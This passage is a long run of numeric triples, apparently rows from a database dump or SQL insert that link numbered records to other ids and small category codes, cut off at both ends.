302,121,128),(1303,119,128),(1304,118,128),(1305,1688,145),(1306,88,128),(1307,1365,149),(1308,1351,149),(1309,75,128),(1310,74,128),(1311,70,128),(1312,69,128),(1313,1337,149),(1314,67,128),(1315,66,128),(1316,1356,149),(1317,58,128),(1318,1343,149),(1319,1342,149),(1320,53,128),(1321,42,128),(1322,35,128),(1323,34,128),(1324,33,128),(1325,1290,149),(1326,1282,149),(1327,28,128),(1328,27,128),(1329,1281,149),(1330,1265,149),(1331,26,128),(1332,1275,149),(1333,21,128),(1334,1572,145),(1335,19,128),(1336,1268,149),(1337,14,128),(1338,1523,145),(1339,11,128),(1340,9,128),(1341,4,128),(1342,1480,145),(1343,3,128),(1344,2309,149),(1345,1,128),(1346,1137,149),(1347,1299,149),(1348,1287,149),(1349,1108,149),(1350,1343,145),(1351,1213,149),(1352,2269,145),(1353,1281,145),(1354,1160,149),(1355,1150,149),(1356,1134,149),(1357,1119,149),(1358,1100,149),(1359,1099,149),(1360,1005,149),(1361,981,149),(1362,977,149),(1363,1137,145),(1364,509,149),(1365,1131,145),(1366,929,149),(1367,912,149),(1368,905,149),(1369,896,149),(1370,881,149),(1371,877,149),(1372,876,149),(1373,875,149),(1374,867,149),(1375,852,149),(1376,832,149),(1377,707,149),(1378,977,145),(1379,706,149),(1380,509,145),(1381,705,149),(1382,704,149),(1383,771,149),(1384,744,149),(1385,709,149),(1386,881,145),(1387,876,145),(1388,724,149),(1389,875,145),(1390,867,145),(1391,680,149),(1392,832,145),(1393,661,149),(1394,643,149),(1395,605,149),(1396,594,149),(1397,704,145),(1398,557,149),(1399,746,145),(1400,709,145),(1401,507,149),(1402,485,149),(1403,463,149),(1404,643,145),(1405,455,149),(1406,451,149),(1407,442,149),(1408,441,149),(1409,438,149),(1410,415,149),(1411,414,149),(1412,557,145),(1413,412,149),(1414,410,149),(1415,392,149),(1416,387,149),(1417,383,149),(1418,374,149),(1419,507,145),(1420,367,149),(1421,349,149),(1422,347,149),(1423,345,149),(1424,344,149),(1425,342,149),(1426,338,149),(1427,463,145),(1428,328,149),(1429,326,149),(1430,441,145),(1431,322,149),(1432,412,145),(1433,410,145),(1434,405,145),(1435,374,145),(1436,287,149),(1437,367,145),(1438,283,149),(1439,279,149),(1440,278,149),(1441,347,145),(1442,344,145),(1443,338,145),(1444,271,149),(1445,268,149),(1446,322,145),(1447,258,149),(1448,252,149),(1449,242,149),(1450,240,149),(1451,283,145),(1452,237,149),(1453,279,145),(1454,234,149),(1455,268,145),(1456,231,149),(1457,229,149),(1458,242,145),(1459,219,149),(1460,217,149),(1461,237,145),(1462,215,149),(1463,234,145),(1464,209,149),(1465,217,145),(1466,206,149),(1467,206,145),(1468,205,145),(1469,205,149),(1470,203,145),(1471,203,149),(1472,198,145),(1473,191,145),(1474,202,149),(1475,190,145),(1476,189,145),(1477,179,145),(1478,198,149),(1479,191,149),(1480,190,149),(1481,189,149),(1482,169,145),(1483,167,145),(1484,179,149),(1485,164,145),(1486,172,149),(1487,169,149),(1488,167,149),(1489,162,149),(1490,160,149),(1491,153,145),(1492,154,149),(1493,153,149),(1494,151,149),(1495,136,145),(1496,147,149),(1497,125,145),(1498,141,149),(1499,122,145),(1500,136,149),(1501,119,145),(1502,118,145),(1503,128,149),(1504,125,149),(1505,122,149),(1506,121,149),(1507,119,149),(1508,118,149),(1509,88,145),(1510,81,145),(1511,75,145),(1512,74,145),(1513,70,145),(1514,88,149),(1515,69,145),(1516,83,149),(1517,82,149),(1518,81,149),(1519,80,149),(1520,78,149),(1521,50,145),(1522,75,149),(1523,48,145),(1524,74,149),(1525,42,145),(1526,73,149),(1527,35,145),(1528,34,145),(1529,33,145),(1530,70,149),(1531,69,149),(1532,28,145),(1533,67,149),(1534,27,145),(1535,66,149),(1536,26,145),(1537,61,149),(1538,59,149),(1539,58,149),(1540,54,149),(1541,53,149),(1542,52,149),(1543,14,145),(1544,50,149),(1545,49,149),(1546,11,145),(1547,48,149),(1548,9,145),(1549,43,149),(1550,42,149),(1551,4,145),(1552,41,149),(1553,3,145),(1554,39,149),(1555,1,145),(1556,35,149),(1557,34,149),(1558,33,149),(1559,29,149),(1560,28,149),(1561,27,149),(1562,26,149),(1563,24,149),(1564,23,149),(1565,21,149),(1566,19,149),(1567,18,149),(1568,15,149),(1569,14,149),(1570,11,149),(1571,9,149),(1572,7,149),(1573,6,149),(1574,4,149),(1575,3,149),(1576,2,149),(1577,1,149),(1578,2824,134),(1579,2894,135),(1580,2114,134),(1581,2798,135),(1582,1929,134),(1583,1672,134),(1584,2124,135),(1585,1572,134),(1586,2114,135),(1587,1512,134),(1588,1952,135),(1589,1929,135),(1590,1898,135),(1591,2894,129),(1592,1137,134),(1593,2582,129),(1594,1572,135),(1595,1213,134),(1596,2500,129),(1597,1408,135),(1598,977,134),(1599,1343,135),(1600,1268,135),(1601,881,134),(1602,876,134),(1603,867,134),(1604,832,134),(1605,1143,135),(1606,2124,129),(1607,704,134),(1608,2114,129),(1609,771,134),(1610,665,134),(1611,1929,129),(1612,977,135),(1613,509,135),(1614,941,135),(1615,905,135),(1616,441,134),(1617,876,135),(1618,875,135),(1619,412,134),(1620,374,134),(1621,367,134),(1622,704,135),(1623,347,134),(1624,1572,129),(1625,344,134),(1626,338,134),(1627,322,134),(1628,283,134),(1629,1470,129),(1630,268,134),(1631,724,135),(1632,242,134),(1633,238,134),(1634,237,134),(1635,234,134),(1636,217,134),(1637,665,135),(1638,206,134),(1639,191,134),(1640,169,134),(1641,167,134),(1642,160,134),(1643,2309,129),(1644,560,135),(1645,136,134),(1646,125,134),(1647,507,135),(1648,88,134),(1649,75,134),(1650,74,134),(1651,70,134),(1652,1137,129),(1653,441,135),(1654,35,134),(1655,33,134),(1656,27,134),(1657,26,134),(1658,412,135),(1659,11,134),(1660,1025,129),(1661,1,134),(1662,374,135),(1663,371,135),(1664,981,129),(1665,367,135),(1666,977,129),(1667,509,129),(1668,347,135),(1669,344,135),(1670,338,135),(1671,912,129),(1672,876,129),(1673,875,129),(1674,283,135),(1675,867,129),(1676,279,135),(1677,268,135),(1678,832,129),(1679,242,135),(1680,239,135),(1681,238,135),(1682,237,135),(1683,234,135),(1684,704,129),(1685,226,135),(1686,219,135),(1687,217,135),(1688,206,135),(1689,205,135),(1690,191,135),(1691,746,129),(1692,190,135),(1693,189,135),(1694,709,129),(1695,179,135),(1696,169,135),(1697,167,135),(1698,153,135),(1699,145,135),(1700,144,135),(1701,136,135),(1702,125,135),(1703,104,135),(1704,94,135),(1705,88,135),(1706,463,129),(1707,75,135),(1708,441,129),(1709,74,135),(1710,412,129),(1711,410,129),(1712,58,135),(1713,374,129),(1714,42,135),(1715,41,135),(1716,367,129),(1717,35,135),(1718,34,135),(1719,33,135),(1720,349,129),(1721,27,135),(1722,26,135),(1723,344,129),(1724,21,135),(1725,338,129),(1726,14,135),(1727,9,135),(1728,4,135),(1729,3,135),(1730,1,135),(1731,283,129),(1732,278,129),(1733,268,129),(1734,242,129),(1735,217,129),(1736,206,129),(1737,205,129),(1738,191,129),(1739,190,129),(1740,189,129),(1741,179,129),(1742,169,129),(1743,167,129),(1744,162,129),(1745,154,129),(1746,153,129),(1747,136,129),(1748,125,129),(1749,88,129),(1750,75,129),(1751,74,129),(1752,70,129),(1753,69,129),(1754,50,129),(1755,42,129),(1756,41,129),(1757,35,129),(1758,33,129),(1759,28,129),(1760,27,129),(1761,26,129),(1762,9,129),(1763,7,129),(1764,1,129),(1765,2894,131),(1766,2903,131),(1767,2586,131),(1768,2181,131),(1769,2114,131),(1770,1929,131),(1771,1572,131),(1772,1343,131),(1773,2269,131),(1774,1268,131),(1775,1143,131),(1776,1137,131),(1777,977,131),(1778,881,131),(1779,876,131),(1780,875,131),(1781,867,131),(1782,832,131),(1783,704,131),(1784,746,131),(1785,724,131),(1786,665,131),(1787,658,131),(1788,643,131),(1789,560,131),(1790,463,131),(1791,441,131),(1792,412,131),(1793,410,131),(1794,374,131),(1795,371,131),(1796,367,131),(1797,347,131),(1798,344,131),(1799,338,131),(1800,322,131),(1801,283,131),(1802,279,131),(1803,268,131),(1804,242,131),(1805,238,131),(1806,237,131),(1807,234,131),(1808,230,131),(1809,226,131),(1810,219,131),(1811,217,131),(1812,209,131),(1813,206,131),(1814,205,131),(1815,203,131),(1816,198,131),(1817,191,131),(1818,190,131),(1819,189,131),(1820,169,131),(1821,167,131),(1822,153,131),(1823,145,131),(1824,144,131),(1825,136,131),(1826,125,131),(1827,122,131),(1828,118,131),(1829,104,131),(1830,94,131),(1831,75,131),(1832,74,131),(1833,70,131),(1834,66,131),(1835,58,131),(1836,42,131),(1837,41,131),(1838,35,131),(1839,34,131),(1840,33,131),(1841,27,131),(1842,26,131),(1843,20,131),(1844,14,131),(1845,13,131),(1846,11,131),(1847,9,131),(1848,4,131),(1849,3,131),(1850,1,131),(1851,1929,136),(1852,1572,136),(1853,1343,136),(1854,977,136),(1855,912,136),(1856,875,136),(1857,704,136),(1858,709,136),(1859,680,136),(1860,643,136),(1861,441,136),(1862,412,136),(1863,410,136),(1864,374,136),(1865,367,136),(1866,349,136),(1867,344,136),(1868,283,136),(1869,268,136),(1870,242,136),(1871,217,136),(1872,169,136),(1873,167,136),(1874,153,136),(1875,136,136),(1876,125,136),(1877,121,136),(1878,74,136),(1879,69,136),(1880,58,136),(1881,53,136),(1882,50,136),(1883,49,136),(1884,42,136),(1885,41,136),(1886,35,136),(1887,33,136),(1888,28,136),(1889,27,136),(1890,26,136),(1891,13,136),(1892,11,136),(1893,9,136),(1894,7,136),(1895,3,136),(1896,1,136),(1897,2806,151),(1898,2798,151),(1899,2679,151),(1900,2586,151),(1901,2500,151),(1902,2469,151),(1903,2413,151),(1904,2319,151),(1905,2235,151),(1906,2181,151),(1907,2114,151),(1908,2089,151),(1909,1984,151),(1910,1968,151),(1911,1929,151),(1912,1920,151),(1913,1898,151),(1914,1768,151),(1915,1672,151),(1916,1646,151),(1917,1572,151),(1918,1512,151),(1919,1480,151),(1920,1343,151),(1921,1342,151),(1922,1281,151),(1923,1268,151),(1924,1137,151),(1925,1287,151),(1926,981,151),(1927,977,151),(1928,509,151),(1929,929,151),(1930,917,151),(1931,912,151),(1932,881,151),(1933,876,151),(1934,875,151),(1935,867,151),(1936,832,151),(1937,704,151),(1938,746,151),(1939,709,151),(1940,724,151),(1941,680,151),(1942,594,151),(1943,560,151),(1944,557,151),(1945,463,151),(1946,441,151),(1947,438,151),(1948,415,151),(1949,414,151),(1950,412,151),(1951,410,151),(1952,392,151),(1953,374,151),(1954,371,151),(1955,367,151),(1956,347,151),(1957,345,151),(1958,344,151),(1959,338,151),(1960,322,151),(1961,287,151),(1962,283,151),(1963,279,151),(1964,271,151),(1965,268,151),(1966,260,151),(1967,258,151),(1968,242,151),(1969,238,151),(1970,237,151),(1971,234,151),(1972,231,151),(1973,219,151),(1974,217,151),(1975,215,151),(1976,213,151),(1977,206,151),(1978,205,151),(1979,203,151),(1980,198,151),(1981,191,151),(1982,190,151),(1983,189,151),(1984,187,151),(1985,186,151),(1986,179,151),(1987,169,151),(1988,167,151),(1989,164,151),(1990,162,151),(1991,153,151),(1992,152,151),(1993,151,151),(1994,141,151),(1995,137,151),(1996,136,151),(1997,128,151),(1998,125,151),(1999,122,151),(2000,121,151),(2001,88,151),(2002,75,151),(2003,74,151),(2004,70,151),(2005,69,151),(2006,66,151),(2007,58,151),(2008,55,151),(2009,53,151),(2010,49,151),(2011,48,151),(2012,42,151),(2013,41,151),(2014,38,151),(2015,35,151),(2016,34,151),(2017,33,151),(2018,28,151),(2019,27,151),(2020,26,151),(2021,21,151),(2022,18,151),(2023,15,151),(2024,14,151),(2025,11,151),(2026,9,151),(2027,7,151),(2028,5,151),(2029,4,151),(2030,3,151),(2031,1,151),(2032,2500,146),(2033,2181,146),(2034,2114,146),(2035,2016,146),(2036,1984,146),(2037,1929,146),(2038,1898,146),(2039,1669,146),(2040,1572,146),(2041,1343,146),(2042,1064,146),(2043,977,146),(2044,929,146),(2045,912,146),(2046,881,146),(2047,876,146),(2048,875,146),(2049,867,146),(2050,832,146),(2051,704,146),(2052,746,146),(2053,744,146),(2054,724,146),(2055,680,146),(2056,665,146),(2057,575,146),(2058,560,146),(2059,498,146),(2060,481,146),(2061,463,146),(2062,441,146),(2063,410,146),(2064,387,146),(2065,374,146),(2066,371,146),(2067,367,146),(2068,344,146),(2069,322,146),(2070,283,146),(2071,279,146),(2072,278,146),(2073,268,146),(2074,242,146),(2075,238,146),(2076,237,146),(2077,234,146),(2078,217,146),(2079,209,146),(2080,206,146),(2081,205,146),(2082,203,146),(2083,198,146),(2084,191,146),(2085,190,146),(2086,189,146),(2087,179,146),(2088,169,146),(2089,167,146),(2090,162,146),(2091,160,146),(2092,153,146),(2093,136,146),(2094,125,146),(2095,88,146),(2096,81,146),(2097,75,146),(2098,74,146),(2099,70,146),(2100,69,146),(2101,42,146),(2102,41,146),(2103,35,146),(2104,34,146),(2105,33,146),(2106,27,146),(2107,26,146),(2108,11,146),(2109,4,146),(2110,3,146),(2111,1,146),(2112,2870,127),(2113,2482,127),(2114,2500,127),(2115,2264,127),(2116,2220,127),(2117,2125,127),(2118,2114,127),(2119,1984,127),(2120,1968,127),(2121,1929,127),(2122,1922,127),(2123,1913,127),(2124,1903,127),(2125,1897,127),(2126,1888,127),(2127,1838,127),(2128,1758,127),(2129,1752,127),(2130,1716,127),(2131,1688,127),(2132,1624,127),(2133,1637,127),(2134,1582,127),(2135,1578,127),(2136,1572,127),(2137,1496,127),(2138,1486,127),(2139,1464,127),(2140,1343,127),(2141,1283,127),(2142,1137,127),(2143,1299,127),(2144,1134,127),(2145,977,127),(2146,509,127),(2147,929,127),(2148,881,127),(2149,875,127),(2150,873,127),(2151,867,127),(2152,704,127),(2153,746,127),(2154,724,127),(2155,693,127),(2156,680,127),(2157,665,127),(2158,661,127),(2159,658,127),(2160,605,127),(2161,567,127),(2162,560,127),(2163,485,127),(2164,441,127),(2165,412,127),(2166,410,127),(2167,392,127),(2168,374,127),(2169,367,127),(2170,349,127),(2171,347,127),(2172,344,127),(2173,283,127),(2174,278,127),(2175,268,127),(2176,242,127),(2177,237,127),(2178,231,127),(2179,217,127),(2180,206,127),(2181,205,127),(2182,202,127),(2183,191,127),(2184,190,127),(2185,189,127),(2186,179,127),(2187,169,127),(2188,167,127),(2189,162,127),(2190,153,127),(2191,144,127),(2192,136,127),(2193,125,127),(2194,118,127),(2195,91,127),(2196,88,127),(2197,83,127),(2198,75,127),(2199,74,127),(2200,70,127),(2201,69,127),(2202,58,127),(2203,56,127),(2204,54,127),(2205,53,127),(2206,50,127),(2207,42,127),(2208,35,127),(2209,34,127),(2210,33,127),(2211,29,127),(2212,28,127),(2213,27,127),(2214,26,127),(2215,15,127),(2216,14,127),(2217,11,127),(2218,9,127),(2219,7,127),(2220,3,127),(2221,1,127),(2222,73,140),(2223,73,150),(2224,26,150),(2225,13,150),(2226,73,133),(2227,53,148),(2228,42,148),(2229,164,129),(2230,54,129),(2231,1662,145),(2232,121,145),(2233,59,145),(2234,54,145),(2235,53,145),(2236,1131,128),(2237,59,128),(2238,1131,138),(2239,59,138),(2240,1131,144),(2241,164,144),(2242,59,144),(2243,53,140),(2244,59,129),(2245,164,128),(2246,83,150),(2247,58,150),(2248,1131,149),(2249,412,146),(2250,164,146),(2251,53,146),(2252,164,138),(2253,73,138),(2254,53,138),(2255,31,138),(2256,1131,151),(2257,73,151),(2258,59,151),(2259,54,151),(2260,59,140),(2261,54,140),(2262,1131,141),(2263,164,141),(2264,73,141),(2265,31,151),(2266,1131,137),(2267,164,137),(2268,73,137),(2269,59,137),(2270,31,137),(2271,1131,131),(2272,164,131),(2273,73,131),(2274,59,131),(2275,53,131),(2276,1131,134),(2277,59,134),(2278,42,134),(2279,1131,133),(2280,31,133),(2281,345,145),(2282,290,145),(2283,73,145),(2284,58,145),(2285,1131,146),(2286,73,146),(2287,59,150),(2288,73,128),(2289,1131,148),(2290,164,148),(2291,1131,129),(2292,73,148),(2293,46,148),(2294,53,129),(2295,164,149),(2296,2114,136),(2297,1131,136),(2298,164,136),(2299,73,136),(2300,73,130),(2301,31,130),(2302,73,144),(2303,1131,135),(2304,164,135),(2305,1131,132),(2306,164,132),(2307,1131,127),(2308,164,127),(2309,73,127),(2310,31,127),(2311,1207,145),(2312,1207,128),(2313,31,132),(2314,2643,128),(2315,744,128),(2316,59,141),(2317,54,141),(2318,31,141),(2319,747,128),(2320,1119,128),(2321,350,140),(2322,349,140),(2323,73,129),(2324,80,146),(2325,59,146),(2326,2442,128),(2327,268,128),(2328,50,128),(2329,31,128),(2330,342,150),(2331,326,150),(2332,231,150),(2333,219,150),(2334,168,150),(2335,1131,140),(2336,1002,151),(2337,350,151),(2338,349,151),(2339,278,151),(2340,2574,129),(2341,2011,129),(2342,1512,129),(2343,11,129),(2344,1528,129),(2345,2956,144),(2346,747,144),(2347,202,144),(2348,31,144),(2349,1131,139),(2350,164,139),(2351,73,139),(2352,59,139),(2353,53,139),(2354,28,141),(2355,2011,148),(2356,1512,148),(2357,1470,148),(2358,350,148),(2359,15,148),(2360,422,141),(2361,268,141),(2362,2784,128),(2363,1323,128),(2364,557,128),(2365,258,128),(2366,61,128),(2367,485,150),(2368,461,150),(2369,414,150),(2370,349,150),(2371,2221,145),(2372,1768,145),(2373,496,145),(2374,485,145),(2375,387,145),(2376,31,145),(2377,7,145),(2378,2951,137),(2379,2319,137),(2380,2942,141),(2381,1512,141),(2382,771,141),(2383,263,141),(2384,2942,148),(2385,2798,148),(2386,1662,148),(2387,1431,148),(2388,264,146),(2389,253,146),(2390,31,146),(2391,9,146),(2392,2610,145),(2393,2427,145),(2394,287,140),(2395,2859,148),(2396,2574,148),(2397,2469,148),(2398,1920,148),(2399,1773,148),(2400,1720,148),(2401,1672,148),(2402,1637,148),(2403,1528,148),(2404,1389,148),(2405,1365,148),(2406,1313,148),(2407,189,148),(2408,866,146),(2409,66,146),(2410,28,146),(2411,1876,151),(2412,1394,151),(2413,496,151),(2414,263,151),(2415,168,151),(2416,80,151),(2417,1876,141),(2418,1662,141),(2419,209,141),(2420,3,141),(2421,2011,144),(2422,1920,144),(2423,263,144),(2424,2870,145),(2425,2396,145),(2426,1874,145),(2427,1672,145),(2428,1582,145),(2429,1475,145),(2430,1324,145),(2431,1287,145),(2432,866,145),(2433,2022,132),(2434,1672,132),(2435,1582,132),(2436,1480,132),(2437,304,132),(2438,240,132),(2439,5,132),(2440,2022,133),(2441,1672,133),(2442,1582,133),(2443,1480,133),(2444,1351,133),(2445,938,133),(2446,304,133),(2447,240,133),(2448,164,133),(2449,83,133),(2450,66,133),(2451,7,133),(2452,2130,149),(2453,1189,149),(2454,304,149),(2455,204,149),(2456,13,149),(2457,2022,140),(2458,1351,140),(2459,566,140),(2460,240,140),(2461,2022,137),(2462,1876,137),(2463,1672,137),(2464,1582,137),(2465,1480,137),(2466,769,137),(2467,768,137),(2468,304,137),(2469,263,137),(2470,258,137),(2471,240,137),(2472,231,137),(2473,48,137),(2474,2022,141),(2475,1672,141),(2476,1582,141),(2477,1480,141),(2478,1351,141),(2479,769,141),(2480,566,141),(2481,326,141),(2482,304,141),(2483,240,141),(2484,2022,145),(2485,1351,145),(2486,240,145),(2487,2022,146),(2488,1967,146),(2489,1672,146),(2490,1582,146),(2491,1480,146),(2492,769,146),(2493,304,146),(2494,240,146),(2495,2022,139),(2496,1672,139),(2497,1480,139),(2498,1351,139),(2499,769,139),(2500,566,139),(2501,360,139),(2502,240,139),(2503,2022,148),(2504,1816,148),(2505,1582,148),(2506,304,148),(2507,2942,136),(2508,2798,136),(2509,2011,136),(2510,2022,136),(2511,1920,136),(2512,1672,136),(2513,1582,136),(2514,1480,136),(2515,1470,136),(2516,867,136),(2517,240,136),(2518,70,136),(2519,66,136),(2520,47,136),(2521,46,136),(2522,14,136),(2523,2022,138),(2524,1979,138),(2525,1672,138),(2526,1582,138),(2527,1480,138),(2528,1351,138),(2529,1189,138),(2530,1299,138),(2531,912,138),(2532,705,138),(2533,769,138),(2534,768,138),(2535,566,138),(2536,496,138),(2537,448,138),(2538,349,138),(2539,304,138),(2540,303,138),(2541,290,138),(2542,205,138),(2543,58,138),(2544,36,138),(2545,2769,130),(2546,2469,130),(2547,2413,130),(2548,2022,130),(2549,1672,130),(2550,1582,130),(2551,1486,130),(2552,1480,130),(2553,1281,130),(2554,566,130),(2555,164,130),(2556,59,130),(2557,54,130),(2558,342,141),(2559,2022,151),(2560,1979,151),(2561,1913,151),(2562,1582,151),(2563,1351,151),(2564,769,151),(2565,566,151),(2566,342,151),(2567,326,151),(2568,304,151),(2569,240,151),(2570,2942,129),(2571,2859,129),(2572,2824,129),(2573,2870,128),(2574,2798,129),(2575,2769,129),(2576,2824,128),(2577,2610,128),(2578,2465,129),(2579,2469,129),(2580,2413,129),(2581,2427,128),(2582,2235,129),(2583,2022,129),(2584,2022,128),(2585,1920,129),(2586,1979,128),(2587,1672,129),(2588,1637,129),(2589,1672,128),(2590,1582,129),(2591,1582,128),(2592,1480,129),(2593,1480,128),(2594,1431,129),(2595,1389,129),(2596,1365,129),(2597,1351,129),(2598,1324,128),(2599,1281,129),(2600,360,128),(2601,304,128),(2602,231,128),(2603,240,129),(2604,83,128),(2605,48,128),(2606,58,129),(2607,342,137),(2608,326,137),(2609,867,133),(2610,566,133),(2611,2022,144),(2612,1582,144),(2613,1480,144),(2614,304,144),(2615,240,144),(2616,1351,144),(2617,769,144),(2618,768,144),(2619,566,144),(2620,2006,148),(2621,1979,148),(2622,1281,148),(2623,485,148),(2624,59,148),(2625,54,148),(2626,1979,144),(2627,1688,144),(2628,728,144),(2629,485,144),(2630,1688,138),(2631,1512,138),(2632,1281,138),(2633,1390,138),(2634,470,138),(2635,728,138),(2636,485,138),(2637,1979,140),(2638,1688,140),(2639,1512,140),(2640,1281,140),(2641,728,140),(2642,485,140),(2643,1704,141),(2644,1688,141),(2645,1281,141),(2646,1390,141),(2647,728,141),(2648,485,141),(2649,1119,141),(2650,2235,148),(2651,1207,148),(2652,389,148),(2653,338,148),(2654,219,148),(2655,1582,140),(2656,1185,140),(2657,1390,140),(2658,470,140),(2659,2469,141),(2660,836,141),(2661,768,141),(2662,1523,140),(2663,836,140),(2664,168,140),(2665,168,140),(2666,1185,144),(2667,1390,144),(2668,470,144),(2669,836,144),(2670,168,144),(2671,1185,141),(2672,470,141),(2673,1979,137),(2674,1688,137),(2675,1281,137),(2676,1185,137),(2677,1390,137),(2678,470,137),(2679,836,137),(2680,728,137),(2681,566,137),(2682,485,137),(2683,168,137),(2684,2001,151),(2685,1822,151),(2686,1704,151),(2687,1688,151),(2688,1207,151),(2689,1185,151),(2690,1390,151),(2691,1119,151),(2692,470,151),(2693,836,151),(2694,705,151),(2695,768,151),(2696,728,151),(2697,674,151),(2698,507,151),(2699,485,151),(2700,202,151),(2701,171,151),(2702,171,141),(2703,168,141),(2704,2942,138),(2705,2859,138),(2706,2824,138),(2707,2574,138),(2708,2011,138),(2709,2001,138),(2710,1920,138),(2711,1822,138),(2712,1773,138),(2713,1720,138),(2714,1662,138),(2715,1603,138),(2716,1528,138),(2717,1470,138),(2718,1431,138),(2719,1389,138),(2720,1365,138),(2721,2215,138),(2722,1185,138),(2723,1313,138),(2724,836,138),(2725,438,138),(2726,319,138),(2727,168,138),(2728,1979,146),(2729,1688,146),(2730,1512,146),(2731,1351,146),(2732,1281,146),(2733,1390,146),(2734,470,146),(2735,836,146),(2736,768,146),(2737,728,146),(2738,566,146),(2739,485,146),(2740,168,146),(2741,2942,150),(2742,2465,150),(2743,2396,150),(2744,2022,150),(2745,1979,150),(2746,1920,150),(2747,1688,150),(2748,1582,150),(2749,1539,150),(2750,1480,150),(2751,1470,150),(2752,1185,150),(2753,1390,150),(2754,470,150),(2755,866,150),(2756,836,150),(2757,769,150),(2758,768,150),(2759,728,150),(2760,566,150),(2761,304,150),(2762,292,150),(2763,240,150),(2764,2000,148),(2765,1748,148),(2766,1688,148),(2767,1390,148),(2768,989,148),(2769,836,148),(2770,728,148),(2771,1979,136),(2772,1688,136),(2773,1512,136),(2774,1351,136),(2775,1281,136),(2776,1390,136),(2777,728,136),(2778,485,136),(2779,2022,131),(2780,1979,131),(2781,1688,131),(2782,1672,131),(2783,1582,131),(2784,1512,131),(2785,1480,131),(2786,1351,131),(2787,1281,131),(2788,1185,131),(2789,1390,131),(2790,872,131),(2791,470,131),(2792,836,131),(2793,769,131),(2794,768,131),(2795,728,131),(2796,566,131),(2797,485,131),(2798,304,131),(2799,240,131),(2800,168,131),(2801,31,131),(2802,2022,135),(2803,1979,135),(2804,1688,135),(2805,1672,135),(2806,1582,135),(2807,1512,135),(2808,1480,135),(2809,1351,135),(2810,1281,135),(2811,1185,135),(2812,1390,135),(2813,1299,135),(2814,470,135),(2815,867,135),(2816,836,135),(2817,769,135),(2818,768,135),(2819,728,135),(2820,566,135),(2821,485,135),(2822,287,135),(2823,264,135),(2824,263,135),(2825,240,135),(2826,202,135),(2827,168,135),(2828,70,135),(2829,53,135),(2830,31,135),(2831,4,140),(2832,2942,139),(2833,2011,139),(2834,1979,139),(2835,1688,139),(2836,1678,139),(2837,1281,139),(2838,1185,139),(2839,1390,139),(2840,1108,139),(2841,1165,139),(2842,1119,139),(2843,771,139),(2844,728,139),(2845,485,139),(2846,2942,151),(2847,2824,151),(2848,2485,151),(2849,2011,151),(2850,1470,151),(2851,1431,151),(2852,1365,151),(2853,771,151),(2854,319,151),(2855,2824,141),(2856,2798,141),(2857,2574,141),(2858,2485,141),(2859,1920,141),(2860,1528,141),(2861,1470,141),(2862,1431,141),(2863,319,141),(2864,1431,137),(2865,561,137),(2866,496,137),(2867,389,137),(2868,349,137),(2869,319,137),(2870,137,137),(2871,1154,144),(2872,507,144),(2873,495,144),(2874,292,144),(2875,264,144),(2876,258,144),(2877,7,144),(2878,2798,150),(2879,1637,150),(2880,507,150),(2881,137,150),(2882,2,150),(2883,2652,129),(2884,2651,129),(2885,2520,129),(2886,2427,129),(2887,2169,129),(2888,2160,129),(2889,1979,129),(2890,1688,129),(2891,1342,129),(2892,1390,129),(2893,836,129),(2894,728,129),(2895,566,129),(2896,485,129),(2897,168,129),(2898,137,129),(2899,73,135),(2900,2942,147),(2901,2870,147),(2902,2825,147),(2903,2610,147),(2904,2535,147),(2905,2500,147),(2906,2427,147),(2907,2396,147),(2908,2315,147),(2909,2235,147),(2910,2221,147),(2911,2181,147),(2912,2114,147),(2913,2022,147),(2914,1984,147),(2915,1979,147),(2916,1968,147),(2917,1929,147),(2918,1913,147),(2919,1688,147),(2920,1672,147),(2921,1662,147),(2922,1582,147),(2923,1572,147),(2924,1512,147),(2925,1523,147),(2926,1502,147),(2927,1480,147),(2928,1470,147),(2929,1464,147),(2930,1475,147),(2931,1365,147),(2932,1351,147),(2933,1324,147),(2934,1343,147),(2935,2269,147),(2936,1281,147),(2937,1207,147),(2938,1185,147),(2939,1390,147),(2940,1137,147),(2941,1299,147),(2942,1131,147),(2943,977,147),(2944,931,147),(2945,881,147),(2946,876,147),(2947,875,147),(2948,470,147),(2949,867,147),(2950,866,147),(2951,836,147),(2952,832,147),(2953,704,147),(2954,769,147),(2955,768,147),(2956,767,147),(2957,746,147),(2958,728,147),(2959,680,147),(2960,643,147),(2961,566,147),(2962,557,147),(2963,507,147),(2964,498,147),(2965,496,147),(2966,485,147),(2967,463,147),(2968,441,147),(2969,412,147),(2970,410,147),(2971,374,147),(2972,371,147),(2973,367,147),(2974,347,147),(2975,345,147),(2976,344,147),(2977,338,147),(2978,322,147),(2979,304,147),(2980,290,147),(2981,283,147),(2982,279,147),(2983,268,147),(2984,242,147),(2985,240,147),(2986,237,147),(2987,234,147),(2988,231,147),(2989,217,147),(2990,209,147),(2991,206,147),(2992,205,147),(2993,203,147),(2994,191,147),(2995,190,147),(2996,189,147),(2997,179,147),(2998,169,147),(2999,168,147),(3000,167,147),(3001,164,147),(3002,153,147),(3003,151,147),(3004,136,147),(3005,125,147),(3006,121,147),(3007,119,147),(3008,118,147),(3009,88,147),(3010,75,147),(3011,74,147),(3012,73,147),(3013,70,147),(3014,69,147),(3015,66,147),(3016,59,147),(3017,58,147),(3018,54,147),(3019,53,147),(3020,50,147),(3021,48,147),(3022,42,147),(3023,35,147),(3024,34,147),(3025,33,147),(3026,31,147),(3027,28,147),(3028,27,147),(3029,26,147),(3030,11,147),(3031,9,147),(3032,7,147),(3033,4,147),(3034,3,147),(3035,1,147),(3036,2500,143),(3037,2483,143),(3038,2366,143),(3039,2181,143),(3040,2114,143),(3041,2022,143),(3042,1984,143),(3043,1979,143),(3044,1968,143),(3045,1929,143),(3046,1688,143),(3047,1672,143),(3048,1582,143),(3049,1572,143),(3050,1512,143),(3051,1480,143),(3052,1351,143),(3053,1343,143),(3054,2269,143),(3055,1281,143),(3056,1185,143),(3057,1390,143),(3058,1137,143),(3059,1131,143),(3060,1011,143),(3061,977,143),(3062,912,143),(3063,881,143),(3064,876,143),(3065,470,143),(3066,867,143),(3067,836,143),(3068,832,143),(3069,704,143),(3070,769,143),(3071,768,143),(3072,746,143),(3073,728,143),(3074,680,143),(3075,665,143),(3076,566,143),(3077,560,143),(3078,485,143),(3079,476,143),(3080,463,143),(3081,412,143),(3082,374,143),(3083,371,143),(3084,347,143),(3085,344,143),(3086,338,143),(3087,322,143),(3088,304,143),(3089,283,143),(3090,279,143),(3091,268,143),(3092,263,143),(3093,242,143),(3094,240,143),(3095,238,143),(3096,237,143),(3097,234,143),(3098,217,143),(3099,206,143),(3100,198,143),(3101,191,143),(3102,179,143),(3103,169,143),(3104,168,143),(3105,167,143),(3106,164,143),(3107,136,143),(3108